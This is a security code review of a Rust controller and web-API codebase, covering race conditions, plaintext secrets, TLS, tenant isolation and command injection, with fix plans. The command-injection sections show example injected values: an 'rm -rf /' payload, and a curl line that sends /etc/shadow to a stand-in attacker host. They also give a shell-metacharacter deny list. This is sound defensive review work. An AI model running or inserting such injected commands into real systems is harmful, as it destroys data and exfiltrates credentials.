# Controller System Code Review

Reviewed: 2026-02-08
Scope: Full controller stack — `uptrakit-controller`, `uptrakit-web-api`, shared crates (`db`, `wire`, `web-api-types`, `enrollment`), and provider crates.
Commit: `b855b6f`

> This review covers architecture, security & safety, high availability, data integrity, and best practices. Findings from the wire-protocol-specific review (`crates/shared/wire/CODEREVIEW.md`) are referenced but not duplicated — only new or broader findings appear here.

---

## Table of Contents

1. [Findings Summary](#findings-summary)
2. [Critical Findings](#1-critical-findings)
3. [High Findings](#2-high-findings)
4. [Medium Findings](#3-medium-findings)
5. [Low Findings](#4-low-findings)
6. [Positive Observations](#5-positive-observations)
7. [Fix Plans](#fix-plans)

---

## Findings Summary

| Severity | Count | Key Themes |
|----------|-------|------------|
| **CRITICAL** | 6 | First-user race, MQTT creds at rest, CA key exposure surface, tenant header bypass, TOFU verifier, logout authz bypass |
| **HIGH** | 12 | Command injection in hooks, merge without transaction, missing update ownership validation, missing cert lifetime cap, missing connection limits, DB schema gaps |
| **MEDIUM** | 18 | Race conditions in rate limiter / settings / leases, missing refresh token rotation, N+1 queries, SSRF vectors, settings desync, CRL gap |
| **LOW** | 16 | Missing validation, minor inconsistencies, defense-in-depth gaps |

---

## 1. Critical Findings

### CR-1: Race condition in first-user owner role assignment

**Files:** `web-api/src/routes/auth.rs:86-136`, `web-api/src/routes/oidc_auth.rs:443-477`

The "first user" check uses `User::find().count()` followed by role assignment without any transactional isolation. Two concurrent registration requests can both observe `count == 0` and both receive the `owner` role, granting full administrative access to both accounts.

**Impact:** An attacker can race the first user registration to obtain owner privileges.

**Fix plan:** [FP-CR1](#fp-cr1-atomic-first-user-registration)

### CR-2: MQTT passwords stored and transmitted in plaintext

**Files:** `db/src/entity/mqtt_client.rs:16`, `web-api/src/routes/mqtt_ws.rs:491`, `notification_service.rs:71`

MQTT broker passwords are:
- Stored as `Option<String>` in the database with no encryption at rest
- Transmitted to MQTT service instances in plaintext JSON over WebSocket
- Written to the `controller_events` outbox table as serialized JSON (overlaps with wire CODEREVIEW A1)

**Impact:** Database compromise exposes all MQTT broker credentials. Wire-level logging or proxy inspection reveals passwords.

**Fix plan:** [FP-CR2](#fp-cr2-encrypt-sensitive-credentials-at-rest)

### CR-3: CA private keys in shared `CaSnapshotData` structure

**Files:** `controller/src/pki.rs:216-220`, `web-api/src/lib.rs:50-55`

The `CaSnapshotData` contains both metadata (fingerprints, cert PEMs) and secrets (`active_key_pem`, `previous_key_pem`). This snapshot is broadcast via a `watch` channel to every component that holds a receiver, including `AppState` which is `Arc`-shared with all HTTP handlers. Additionally, CA private keys are stored unencrypted in the `ca_certificates` DB table.

**Impact:** If any API handler accidentally serializes the snapshot, CA private keys leak. Database compromise yields all historical CA private keys.

**Fix plan:** [FP-CR3](#fp-cr3-separate-ca-signing-material-from-metadata)

### CR-4: Unauthenticated tenant context switching via header

**File:** `web-api/src/middleware/tenant_context.rs:29-51`

The `TenantContext` extractor reads `X-Tenant-Id` from request headers with NO authorization check. Any client (authenticated or not) can set this header to any UUID. If multi-tenancy is ever enabled, this is a complete tenant isolation bypass.

**Impact:** Currently limited (single-tenant mode), but becomes critical if multi-tenancy is activated.

**Fix plan:** [FP-CR4](#fp-cr4-restrict-tenant-context-header)

### CR-5: TOFU TLS verifier accepts all certificates and signatures

**File:** `enrollment/src/tls.rs:115-174`

The `AcceptAnyCert` verifier unconditionally returns success for `verify_server_cert`, `verify_tls12_signature`, AND `verify_tls13_signature`. This means it bypasses not just certificate chain validation but also handshake signature verification, enabling trivial MITM during TOFU enrollment.

**Impact:** Active MITM during `--tofu` enrollment can inject a rogue CA, compromising all subsequent mTLS connections.

**Mitigating factors:** `--tofu` is opt-in, conflicts with `--ca-cert` and `--pki-addr`, and is skipped if CA is already cached.

**Fix plan:** [FP-CR5](#fp-cr5-strengthen-tofu-with-fingerprint-pinning)

### CR-6: Logout endpoint accepts unauthenticated requests

**Files:** `web-api/src/lib.rs:437`, `web-api/src/routes/auth.rs:307-321`

The `logout` route is registered outside the `auth_routes` group (which has `require_auth` middleware). Any unauthenticated caller can revoke any valid refresh token by providing its value.

**Impact:** Design violation — defense in depth requires the caller to prove ownership before revocation. Practical exploitation requires guessing a 256-bit token.

**Fix plan:** [FP-CR6](#fp-cr6-require-auth-on-logout)

---

## 2. High Findings

### HI-1: Command injection in update hooks via admin-configurable parameters

**File:** `web-api/src/update_hooks.rs:138-172`

`resolve_systemd_hook()` directly interpolates `service_name` into a shell command (`systemctl {action} {service_name}`). Similarly, `resolve_docker_compose_hook()` interpolates `project_dir` and `compose_file`. A compromised admin account can set `service_name` to `nginx; rm -rf /`, achieving RCE on agents.

**Impact:** Stored command injection executed on remote agents. Requires admin privileges but has unlimited blast radius.

**Fix plan:** [FP-HI1](#fp-hi1-sanitize-hook-parameters)

### HI-2: Service merge operation not wrapped in a transaction

**File:** `web-api/src/routes/services.rs:455-635`

The merge operation performs sequential DB operations (deactivate source, revoke certs, update target, copy host links) without a transaction. A mid-operation failure leaves the system in an inconsistent, potentially irrecoverable state.

**Impact:** Partial failure leaves orphaned services and irrecoverable state.

**Fix plan:** [FP-HI2](#fp-hi2-wrap-merge-in-transaction)

### HI-3: No authorization check on update status messages from agents

**File:** `web-api/src/routes/agent_ws.rs:306-389`

`UpdateStarted`, `UpdateOutput`, and `UpdateResult` handlers look up `update_history` records by ID without verifying the record belongs to a host linked to the authenticated agent. A compromised agent can manipulate status and output of updates belonging to other agents.

**Impact:** Cross-agent update record tampering via UUID guessing (v7 UUIDs are time-ordered).

> Also identified in wire CODEREVIEW as D2.

**Fix plan:** See wire CODEREVIEW FP-17.

### HI-4: No maximum certificate lifetime enforcement in cert signer

**File:** `controller/src/cert_signer.rs:28-29`

`sign_agent_csr()` accepts an arbitrary `time::Duration` with no upper bound. An extremely large duration would produce a certificate valid for decades.

**Fix plan:** [FP-HI4](#fp-hi4-cap-certificate-lifetime)

### HI-5: No maximum connection limit for WebSocket

**Files:** `web-api/src/service_connections.rs:55-90`, `web-api/src/routes/service_ws.rs:150-188`

The `ServiceConnectionRegistry` accepts unlimited registrations. Combined with the lack of rate limiting on anonymous WebSocket upgrades, this creates an unbounded memory exhaustion vector.

> Also identified in wire CODEREVIEW as S2.

**Fix plan:** See wire CODEREVIEW FP-1, extended with a registry connection cap.

### HI-6: MQTT lease race condition — no DB-level locking

**File:** `web-api/src/mqtt_lease_coordinator.rs:82-155`

Lease assignment uses application-level filtering without `SELECT FOR UPDATE` or unique constraint enforcement. Two controllers can simultaneously assign the same MQTT client to different services.

> Also identified in wire CODEREVIEW as H5.

**Fix plan:** See wire CODEREVIEW FP-8.

### HI-7: EventPoller cursor gap can cause missed events

**File:** `web-api/src/event_poller.rs:37-38`

The poller initializes `last_seen_id` to the current max ID. Events written between initialization and the first poll, or during a crash/restart window, may be permanently skipped.

> Also identified in wire CODEREVIEW as H2 and H3.

**Fix plan:** See wire CODEREVIEW FP-3, FP-12.

### HI-8: `service_certificates.service_id` FK has no ON DELETE action

**File:** `controller/src/migration/m20260129_000008_create_agent_certificates.rs:43-48`

No `on_delete()` is specified, defaulting to `RESTRICT`. This is inconsistent with `service_hosts` (CASCADE) — deleting a service cascades host links but is blocked by certificates, creating a half-deleted state.

**Fix plan:** [FP-HI8](#fp-hi8-fix-fk-cascade-inconsistencies)

### HI-9: `service_certificates.ca_fingerprint` has no FK to `ca_certificates`

**Files:** `migration/m20260129_000008` (service_certificates), `migration/m20260207_000025` (ca_certificates)

The `ca_fingerprint` composite PK column has no foreign key to `ca_certificates.fingerprint`. Migration 008 runs before 025, so the FK couldn't be defined at creation time — but no subsequent migration adds it.

**Fix plan:** [FP-HI8](#fp-hi8-fix-fk-cascade-inconsistencies) (combined)

### HI-10: `load_host_agents` helper lacks tenant scoping

**File:** `web-api/src/routes/hosts.rs:301-339`

Queries agents by `host_id` without tenant filtering. In multi-tenant mode, agents from another tenant could leak into host responses.

**Fix plan:** [FP-HI10](#fp-hi10-add-tenant-filter-to-host-agents)

### HI-11: No rate limiting on token refresh endpoint

**File:** `web-api/src/routes/auth.rs:382-443`

The refresh endpoint is public and has no dedicated rate limiting. An attacker with a stolen refresh token could rapidly generate access tokens.

**Fix plan:** [FP-HI11](#fp-hi11-rate-limit-refresh-endpoint)

### HI-12: OIDC client_secret stored in plaintext

**File:** `db/src/entity/oidc_provider.rs:71`, `controller/src/main.rs:388`

The OIDC client secret is stored as a bare string in the database. Database compromise exposes all OIDC client secrets.

**Fix plan:** [FP-CR2](#fp-cr2-encrypt-sensitive-credentials-at-rest) (combined)

---

## 3. Medium Findings

### ME-1: No refresh token rotation on use

**File:** `web-api/src/auth/session.rs:62-92`

When a refresh token is used, it is NOT rotated. If stolen, it remains usable for its full 7-day lifetime even after the legitimate user refreshes.

**Fix plan:** [FP-ME1](#fp-me1-implement-refresh-token-rotation)

### ME-2: OIDC auto-link without email verification

**File:** `web-api/src/auth/authentication.rs:156-159`

The `AutoLink` branch auto-links OIDC identity to an existing user based solely on email match. If the OIDC provider doesn't verify email addresses, this enables account takeover.

**Fix plan:** [FP-ME2](#fp-me2-check-email-verified-before-auto-link)

### ME-3: TOCTOU race in rate limit check

**File:** `web-api/src/auth/rate_limit.rs:62-106`

The read-then-update pattern allows concurrent requests to both pass the limit check before either increments the counter.

### ME-4: Rate limit fails open on database error

**File:** `web-api/src/middleware/rate_limit.rs:96-99`

Database outage completely disables rate limiting, allowing unrestricted brute-force attacks on auth endpoints.

### ME-5: Device flow approval lacks rate limiting and permission check

**Files:** `web-api/src/routes/device_auth.rs:183-215`, `middleware/rate_limit.rs:20-58`

The `/api/v1/auth/device/approve` endpoint is not rate-limited (user code brute-force risk) and any authenticated user can approve device flows regardless of permissions.

### ME-6: JWT-authenticated requests don't check user active status

**File:** `web-api/src/middleware/require_auth.rs:126-156`

The JWT path trusts claims without a database check. A deactivated user's JWT remains valid for up to 15 minutes. The API token path correctly checks `is_active`.

### ME-7: N+1 query patterns in list endpoints

**Files:** `web-api/src/routes/hosts.rs:87-91`, `software_items.rs:356-374`, `update_history.rs:194-199`

`list_hosts` issues an individual query per host (up to 1000). Same patterns in software items and update history.

### ME-8: Non-atomic settings reload across HA instances

**File:** `web-api/src/settings.rs:232-281`

`reload_from_db()` acquires/releases locks on each setting individually. Readers can observe partially-updated state between lock releases.

### ME-9: SSRF vector in GitHub provider via `api_base_url`

**File:** `providers/github/src/config.rs:17-19`

User-provided `api_base_url` is directly used in API requests without scheme validation or private IP blocking. Combined with unvalidated `owner`/`repo`, this enables SSRF.

### ME-10: Docker Registry auth token URL params not URL-encoded

**File:** `providers/docker-registry/src/auth.rs:69-82`

`service` and `scope` values from the `WWW-Authenticate` header are appended without URL encoding, enabling parameter injection by a malicious registry.

### ME-11: OIDC redirect URL constructed from client-supplied headers

**File:** `web-api/src/routes/oidc_auth.rs:1182-1196`

When `ExternalBaseUrl` is not configured, the `Origin` or `Host` header is used to construct OIDC redirect URLs. An attacker can redirect OIDC callbacks to their domain.

### ME-12: CRL `next_update` creates 24-hour revocation visibility gap

**File:** `controller/src/crl_manager.rs:295`

CRL clients cache until `next_update` (24h). Revoking a certificate has no effect on clients that already cached the old CRL.

### ME-13: MQTT client count limit TOCTOU

**File:** `web-api/src/mqtt_client_store.rs:88-91`

Count-then-insert pattern allows concurrent requests to exceed the configured maximum.

### ME-14: Settings version bump race in concurrent writes

**File:** `web-api/src/settings_store.rs:127-172`

Two concurrent first-time writes for a new tenant can both attempt to insert into `settings_version`, causing a unique constraint violation.

### ME-15: Server key file written without restricted permissions

**Files:** `controller/src/pki.rs:713-714`, `web-api/src/routes/server_cert.rs:137-140`

`std::fs::write()` uses the default umask. The private key file could be world-readable on permissive systems.

### ME-16: Registration settings desync across HA instances

**File:** `web-api/src/auth/registration.rs:158-261`

In-memory `RegistrationSettings` updated after DB writes. Other controller instances may serve stale registration mode (e.g., `Invite` instead of `Closed`).

### ME-17: Enrollment secret not zeroized in memory

**File:** `enrollment/src/identity.rs:318-337`

The `enrollment_secret` is stored as a plain `String` in `ServiceState` without `Zeroize`. Debug-derived `EnrolledPayload` can print secrets.

> Also identified in wire CODEREVIEW as S7.

### ME-18: Update history tenant scoping loads all host models

**File:** `web-api/src/routes/update_history.rs:61-70`

Loads all `Host` models for a tenant just to extract UUIDs, then passes all IDs to an `IN()` clause. Wasteful for tenants with many hosts.

---

## 4. Low Findings

### LO-1: No email format validation in registration

**File:** `web-api/src/routes/auth.rs:39-188`

Only password length is validated. Empty strings, strings without `@`, and absurdly long strings are accepted as emails.

### LO-2: No password maximum length check

**File:** `web-api/src/routes/auth.rs:49`

Minimum 8 characters but no maximum. Extremely long passwords sent to Argon2 can cause CPU exhaustion.

### LO-3: API token name has no length validation

**File:** `web-api/src/routes/api_tokens.rs:29-51`

Unbounded name string could waste database storage.

### LO-4: API tokens have no expiration

**File:** `db/src/entity/api_token.rs`

No `expires_at` field. Tokens remain valid indefinitely until manually revoked.

### LO-5: Case-sensitive email comparison

**File:** `web-api/src/auth/authentication.rs:116-120`

Database collation may treat `user@Example.com` and `user@example.com` as different users.

### LO-6: No JWT audience/issuer claim validation

**File:** `web-api/src/auth/jwt.rs:16-26`

`AccessTokenClaims` has no `aud` or `iss` fields. Tokens from one service could be replayed against another in a multi-service architecture.

### LO-7: `last_used_at` write on every API token use

**File:** `web-api/src/auth/api_token.rs:121-126`

Every authenticated API request triggers a DB write. Write amplification under heavy API token usage.

### LO-8: Revoked sessions not cleaned up

**File:** `web-api/src/auth/session.rs:94-112`

`cleanup_expired_sessions` only deletes expired sessions, not revoked ones. Revoked sessions accumulate.

### LO-9: Soft-delete column naming inconsistency

**Files:** Multiple entities

Three different names for the same concept: `deactivated_at` (most entities), `deleted_at` (`oidc_providers`), `revoked_at` (`sessions`, `api_tokens`).

### LO-10: Missing indexes on hot query paths

**Files:** Multiple migrations

- `user_roles`: No index on `(user_id)` or `(role_id, tenant_id)` for role lookups
- `sessions`: No index on `revoked_at` for active session queries
- `service_certificates`: No FK index to `ca_certificates`

### LO-11: `available_versions` allows duplicate version strings per software item

**File:** `migration/m20260201_000015`

No unique constraint on `(software_item_id, version)`. Multiple rows with the same version can be inserted.

### LO-12: `update_history.status` stored as free-form string

**File:** `migration/m20260203_000018:29`

No CHECK constraint ensuring only valid status values (`pending`, `in_progress`, `completed`, `failed`).

### LO-13: Owner role assignment failure silently continues

**File:** `web-api/src/routes/auth.rs:117-136`

If assigning owner role fails, the first user is created without admin access with no recovery path.

### LO-14: PKI HTTP listener hardcoded to `0.0.0.0`

**File:** `controller/src/main.rs:1070`

Binds on all interfaces. In multi-NIC environments this exposes PKI endpoints to untrusted networks.

### LO-15: `controller_events` table has no partition strategy

**File:** `migration/m20260207_000024`

Outbox table grows unbounded. No `expires_at` column; relies on application-level cleanup.

### LO-16: Migration 011 down path is lossy

**File:** `migration/m20260131_000011`

Rolling back destroys user-role assignments for users migrated from admin to owner.

---

## 5. Positive Observations

These aspects demonstrate strong engineering practices:

1. **Consistent permission checks:** Every authenticated endpoint checks specific permissions. No endpoint was found missing its check.

2. **No SQL injection vectors:** All queries use SeaORM's parameterized query builder. Zero raw SQL.

3. **Proper tenant scoping:** All entity lookups in route handlers filter by `tenant_id` consistently.

4. **Strong password hashing:** Argon2id with OWASP-recommended parameters (19 MiB, 2 iterations).

5. **CSRF/PKCE/Nonce in OIDC:** All three protections are correctly implemented with one-time-use server-side state.

6. **HA-safe atomic patterns:** Device flow approve/consume, OIDC flow take, and CA rotation CAS all use atomic DB operations.

7. **Secret masking in API responses:** Provider config secrets are masked in GET responses and restored on PUT.

8. **Replay protection on wire protocol:** Strict monotonic sequence validation with comprehensive test coverage.

9. **Pagination with hard cap:** Max 1000 items per page, enforced in shared types.

10. **No unsafe code:** The entire Rust codebase uses only safe abstractions.

11. **Error messages don't leak internals:** 500 errors return generic messages. Stack traces go to tracing only.

12. **Graceful shutdown orchestration:** Scattered restart notifications, cancellation tokens, drain timeouts.

13. **Soft-delete everywhere:** Destructive operations use soft-delete, enabling audit trails.

14. **Header stripping for non-proxy clients:** Certificate-related headers stripped when not from trusted proxy.

15. **Trusted proxy validation:** Client IP forwarded headers only trusted from configured proxy IPs.

---

## Fix Plans

> **TOP 15 Priority** — The fifteen most impactful issues have detailed implementation-ready fix plans below (covering all 6 Critical, all 12 High, and the 3 most impactful Medium findings). Remaining 30 issues (14 Medium, 16 Low) do not yet have detailed plans.

---

### FP-CR1: Atomic first-user registration (TOP 5 — #1)

**Addresses:** CR-1 (Critical — privilege escalation via race condition)

**Problem:** The first-user registration check uses `User::find().count()` followed by a separate user insert and role assignment with NO transactional isolation. Two concurrent registration requests can both observe `count == 0` and both receive the `owner` role, granting full administrative access to an attacker who races the first legitimate registration.

Additionally, the password path checks `count == 0` *before* creating the user, while the OIDC path checks `count == 1` *after* creating the user — an inconsistency that creates different race windows.

**Current code flow (password path in `web-api/src/routes/auth.rs:86-136`):**
```
1. let user_count = User::find().count(&state.db).await     // read
2. let is_first_user = user_count == 0                        // decide
3. new_user.insert(&state.db).await                           // write (separate operation)
4. if is_first_user { assign_owner_role(&state.db, ...) }     // write (separate operation)
5. complete_initial_setup(...)                                 // write (separate operation)
```

**Current code flow (OIDC path in `web-api/src/routes/oidc_auth.rs:443-477`):**
```
1. resolve_oidc_user() → creates user + assigns "user" role   // write
2. let is_first_user = User::find().count() == 1              // read (AFTER creation)
3. if is_first_user { delete "user" role, assign "owner" }    // write (separate)
4. complete_initial_setup(...)                                 // write (separate)
```

**Detailed implementation plan:**

1. **Extract a shared `register_first_user()` helper** used by both password and OIDC paths:
   ```rust
   /// Atomically registers the first user with owner role.
   /// Returns Ok(true) if this was the first user, Ok(false) otherwise.
   async fn register_first_user(
       db: &DatabaseConnection,
       tenant_id: Uuid,
       user_id: Uuid,
       settings: &SettingsManager,
   ) -> Result<bool> { ... }
   ```

2. **Wrap in a serializable transaction:**
   - `db.begin_with_config(Some(IsolationLevel::Serializable), None).await`
   - Inside: count users, create user, assign owner role, call `complete_initial_setup` (which sets `registration.mode = Closed` and deletes the invite token).
   - `txn.commit().await` — if a concurrent transaction already committed, this will fail with a serialization error.

3. **Add a database-level guard:** Add a unique partial index or constraint on `settings(tenant_id, key)` WHERE `key = 'registration.mode'` AND `value = '"Open"'`. This makes `complete_initial_setup`'s `Closed` write act as a natural mutex — the second racer's transaction fails at commit.

4. **Unify the two paths:** Both password and OIDC registration call the same `register_first_user()` helper. The OIDC path no longer creates the user with a "user" role first, then replaces it; instead it calls the helper directly.

5. **Handle the serialization-error retry:** On `DbErr::...` serialization failure, return `409 Conflict` with "Registration is being processed, please retry" instead of a 500.

**Files to modify:**
- `crates/ui/web-api/src/routes/auth.rs` — extract helper, wrap in transaction
- `crates/ui/web-api/src/routes/oidc_auth.rs` — use shared helper
- `crates/ui/web-api/src/auth/authentication.rs` — adjust `resolve_oidc_user` to not assign role if first-user flow will handle it
- `crates/ui/web-api/src/auth/registration.rs` — make `complete_initial_setup` accept a transaction connection

**Testing:**
- Unit test: concurrent registration attempts (spawn multiple tasks hitting register simultaneously)
- Verify only one user gets owner role
- Verify registration mode switches to Closed atomically

---

### FP-HI1: Eliminate command injection in update hooks (TOP 5 — #2)

**Addresses:** HI-1 (High — stored RCE on remote agents)

**Problem:** `resolve_systemd_hook()` and `resolve_docker_compose_hook()` in `web-api/src/update_hooks.rs` directly interpolate admin-configurable strings (`service_name`, `project_dir`, `compose_file`) into shell commands using `format!()`. These commands are executed by agents via `sh -c`. A compromised admin account (or CSRF/XSS leading to admin config change) can inject arbitrary shell commands that execute on every managed agent.

**Current vulnerable code:**
```rust
// update_hooks.rs:138-140
fn resolve_systemd_hook(hook: &SystemdServiceHook) -> String {
    format!("systemctl {} {}", hook.action.as_str(), hook.service_name)
    // service_name = "nginx; curl attacker.com/$(cat /etc/shadow)"
    // → "systemctl stop nginx; curl attacker.com/$(cat /etc/shadow)"
}

// update_hooks.rs:143-172
fn resolve_docker_compose_hook(hook: &DockerComposeHook) -> String {
    // project_dir and compose_file also directly interpolated
    parts.push(format!("cd {project_dir}"));
    compose_cmd.push_str(&format!(" -f {compose_file}"));
    // ...
}
```

**No validation exists** at any layer — the types in `web-api-types/src/update_hooks.rs` accept bare `String` fields, and the API routes in `provider_configs.rs` and `software_items.rs` pass them through without sanitization.

**Detailed implementation plan:**

1. **Switch to structured command execution (primary fix):**
   Change hook resolution from producing a single shell string to producing a structured `ResolvedCommand`:
   ```rust
   pub struct ResolvedCommand {
       pub program: String,
       pub args: Vec<String>,
       pub working_dir: Option<String>,
   }
   ```
   - `resolve_systemd_hook` → `ResolvedCommand { program: "systemctl", args: vec![action, service_name], working_dir: None }`
   - `resolve_docker_compose_hook` → `ResolvedCommand { program: "docker-compose", args: vec!["-f", compose_file, action, ...], working_dir: Some(project_dir) }`

2. **Update the wire protocol** to transmit `ResolvedCommand` instead of a bare string. The agent executes via `Command::new(program).args(args).current_dir(working_dir)` — never via `sh -c`.

3. **Add input validation at the API boundary** (defense in depth):
   Add a `validate_hook_params()` function in `web-api-types/src/update_hooks.rs`:
   ```rust
   /// Validates hook parameters reject shell metacharacters.
   /// Allowed: alphanumeric, `-`, `_`, `.`, `/` (for paths).
   fn validate_safe_identifier(value: &str, field: &str) -> Result<()> {
       if value.is_empty() { return Err(...) }
       if value.len() > 255 { return Err(...) }
       let forbidden = [';', '&', '|', '$', '`', '(', ')', '{', '}', '<', '>', '\'', '"', '\\', '\n', '\r', '\0'];
       if value.chars().any(|c| forbidden.contains(&c)) {
           return Err(format!("{field} contains forbidden characters"));
       }
       Ok(())
   }
   ```
   - Apply to `service_name` (stricter: only `[a-zA-Z0-9._@-]`, matching systemd unit name rules)
   - Apply to `project_dir` and `compose_file` (path characters only: `[a-zA-Z0-9._/-]`)

4. **Call validation in API routes:**
   - `crates/ui/web-api/src/routes/provider_configs.rs` — validate hook params in `create_provider_config` and `update_provider_config`
   - `crates/ui/web-api/src/routes/software_items.rs` — validate hook params in `create_software_item` and `update_software_item` (config override)

5. **Agent-side change:** Update agent's command executor to use `Command::new()` with the structured args instead of `sh -c <string>`.

**Files to modify:**
- `crates/ui/web-api/src/update_hooks.rs` — new `ResolvedCommand` struct, rewrite resolution functions
- `crates/shared/web-api-types/src/update_hooks.rs` — add validation functions
- `crates/shared/wire/src/lib.rs` — update wire message to carry structured commands
- `crates/ui/web-api/src/routes/provider_configs.rs` — call validation
- `crates/ui/web-api/src/routes/software_items.rs` — call validation, update trigger_update
- `crates/core/agent/` — update command executor
- `crates/shared/wire/asyncapi.yaml` — update schema

**Testing:**
- Unit test: validation rejects `;`, `|`, `$()`, backticks, etc.
- Unit test: `ResolvedCommand` produces correct program/args
- Integration test: hook execution with special characters is safely handled

---

### FP-CR2: Encrypt sensitive credentials at rest (TOP 5 — #3)

**Addresses:** CR-2 (Critical — MQTT password exposure), HI-12 (High — OIDC secret exposure)

**Problem:** Three categories of secrets are stored as plaintext strings in the database:
- `mqtt_clients.password` (`Option<String>`) — MQTT broker credentials
- `oidc_providers.client_secret` (`String`) — OIDC client secrets
- `ca_certificates.key_pem` (`String`) — CA private keys (PEM)

A database compromise (SQL injection in a dependency, backup leak, stolen disk) exposes all secrets. MQTT passwords are also transmitted in plaintext JSON over WebSocket in `MqttTenantConfig` messages and serialized into the `controller_events` outbox table.

**Detailed implementation plan:**

1. **Create a `SecretString` newtype** in the `db` crate:
   ```rust
   /// A string that is encrypted at rest in the database.
   /// Stored as `ENC:v1:<base64(nonce ‖ ciphertext ‖ tag)>`.
   /// Implements `Display` as `***REDACTED***` to prevent accidental logging.
   #[derive(Clone)]
   pub struct SecretString(String);

   impl std::fmt::Debug for SecretString {
       fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
           f.write_str("SecretString(***)")
       }
   }

   impl std::fmt::Display for SecretString {
       fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
           f.write_str("***REDACTED***")
       }
   }
   ```

2. **Implement encryption module** (`crates/shared/db/src/crypto.rs` or a new shared crate):
   - Algorithm: AES-256-GCM (via the `aes-gcm` crate, already widely audited)
   - Master key: 32-byte key loaded from `UPTRAKIT_MASTER_KEY` env var or `--master-key-file` path at startup
   - Format: `ENC:v1:<base64(12-byte-nonce ‖ ciphertext ‖ 16-byte-tag)>`
   - Functions:
     ```rust
     pub fn encrypt(master_key: &[u8; 32], plaintext: &str) -> String
     pub fn decrypt(master_key: &[u8; 32], stored: &str) -> Result<String>
     pub fn is_encrypted(stored: &str) -> bool  // checks "ENC:v1:" prefix
     ```

3. **Implement SeaORM `Value` conversion** for `SecretString`:
   - `From<SecretString> for Value` → calls `encrypt()` before storing
   - `TryGetable for SecretString` → calls `decrypt()` after reading
   - This makes encryption transparent to all entity code

4. **Update entity models:**
   - `mqtt_client.rs`: Change `password: Option<String>` to `password: Option<SecretString>`
   - `oidc_provider.rs`: Change `client_secret: String` to `client_secret: SecretString`
   - `ca_certificate` entity (if one exists) or the CA store: Change `key_pem: String` to `key_pem: SecretString`

5. **Write a migration** to encrypt existing plaintext values:
   - Read all rows with plaintext secrets
   - Encrypt each with the master key
   - Update in-place
   - If `UPTRAKIT_MASTER_KEY` is not set, the migration logs a warning and skips (allowing read-only/dev mode without encryption)

6. **Update wire protocol:** Ensure `MqttTenantConfig.password` is decrypted before being sent to the MQTT service (the wire message goes over mTLS, so plaintext in-transit is acceptable for the mTLS channel).

7. **Ensure secrets never appear in:**
   - API responses (already masked — verify)
   - `controller_events` outbox table (audit the event serialization)
   - Tracing/log output (the `Debug`/`Display` impls prevent this)

**Files to modify:**
- New: `crates/shared/db/src/crypto.rs` (encryption module)
- `crates/shared/db/src/entity/mqtt_client.rs` — `SecretString` field
- `crates/shared/db/src/entity/oidc_provider.rs` — `SecretString` field
- `crates/shared/db/Cargo.toml` — add `aes-gcm`, `base64` dependencies
- `crates/core/controller/src/main.rs` — load master key at startup
- `crates/ui/web-api/src/mqtt_lease_coordinator.rs` — decrypt before wire transmission
- New migration for encrypting existing data
- All stores that read/write these fields (should work transparently via SeaORM)

**Testing:**
- Unit test: round-trip encrypt/decrypt
- Unit test: `SecretString` Debug/Display never reveals plaintext
- Unit test: `is_encrypted` correctly identifies encrypted vs plaintext
- Integration test: create MQTT client with password → verify DB stores encrypted value → verify API returns working password

---

### FP-CR3: Separate CA signing material from metadata (TOP 5 — #4)

**Addresses:** CR-3 (Critical — CA private key exposure surface)

**Problem:** `CaSnapshotData` is a single struct containing both public metadata (fingerprints, cert PEMs, bundle, pki_addr) and private secrets (`active_key_pem`, `previous_key_pem`, `trusted_cas[].key_pem`). This struct is broadcast via a `tokio::sync::watch` channel to every component that holds a receiver — including `AppState` which is `Arc`-shared with all HTTP handlers via Axum's state extraction.

The current data flow:
```
pki.rs::to_snapshot()
  → watch::channel(CaSnapshotData)      ← contains ALL private keys
     ├── AppState.ca_snapshot            ← every HTTP handler can read private keys
     ├── CertSigner.ca_rx               ← needs active key only
     └── CrlManager                     ← needs all trusted keys for CRL signing
```

If any API handler accidentally calls `serde_json::to_string(&snapshot)`, or if a future developer adds debug logging, all CA private keys leak.

**Detailed implementation plan:**

1. **Split into two structs:**
   ```rust
   /// Safe to share with all components. No secret material.
   pub struct CaMetadata {
       pub active_cert_pem: String,
       pub active_fingerprint: String,
       pub previous_cert_pem: Option<String>,
       pub previous_fingerprint: Option<String>,
       pub trusted_ca_certs: Vec<TrustedCaCert>,  // cert + fingerprint only, NO key
       pub trusted_ca_cns: Vec<String>,
       pub bundle_pem: String,
       pub bundle_hash: String,
       pub managed: bool,
       pub active_not_after: time::OffsetDateTime,
       pub pki_addr: Option<String>,
   }

   pub struct TrustedCaCert {
       pub cert_pem: String,
       pub fingerprint: String,
       pub not_after: time::OffsetDateTime,
   }

   /// Secret material. Only accessible to signing components.
   pub struct CaSigningKeys {
       pub active_key_pem: String,
       pub trusted_keys: Vec<TrustedCaKey>,  // fingerprint → key mapping
   }

   pub struct TrustedCaKey {
       pub fingerprint: String,
       pub key_pem: String,
       pub cert_pem: String,  // needed to build Issuer
       pub not_after: time::OffsetDateTime,
   }
   ```

2. **Create two separate watch channels in `main.rs`:**
   ```rust
   let (ca_meta_tx, ca_meta_rx) = watch::channel(ca_metadata);
   let (ca_keys_tx, ca_keys_rx) = watch::channel(ca_signing_keys);
   ```

3. **Update `AppState`** to only hold the metadata receiver:
   ```rust
   pub struct AppState {
       pub ca_metadata: watch::Receiver<CaMetadata>,  // NO private keys
       // ...
   }
   ```

4. **Update `CertSigner`** to hold the signing keys receiver:
   ```rust
   pub struct RcgenAgentCertSigner {
       ca_keys: watch::Receiver<CaSigningKeys>,
   }
   ```

5. **Update `CrlManager`** to take signing keys directly:
   - Constructor: `CrlManager::new(config, &ca_metadata, &ca_signing_keys)` — parses keys into `Issuer` objects immediately
   - `update_ca()` method: accepts `(&CaMetadata, &CaSigningKeys)` pair

6. **Update `pki.rs`:**
   - Replace `to_snapshot()` with `to_metadata()` + `to_signing_keys()`
   - Update all broadcast sites (CA reload task, CA rotation task) to send to both channels

7. **Update HTTP handlers** that currently access `state.ca_snapshot`:
   - Any handler reading cert PEMs, fingerprints, bundle → use `state.ca_metadata`
   - No handler should need private keys

8. **Remove `Serialize` from `CaSigningKeys`** (if present) to make accidental serialization a compile error.

**Files to modify:**
- `crates/ui/web-api/src/lib.rs` — split `CaSnapshotData`, update `AppState`
- `crates/core/controller/src/pki.rs` — split `to_snapshot()`, update broadcast
- `crates/core/controller/src/cert_signer.rs` — use `CaSigningKeys`
- `crates/core/controller/src/crl_manager.rs` — accept split types
- `crates/core/controller/src/main.rs` — create two channels, wire up

**Testing:**
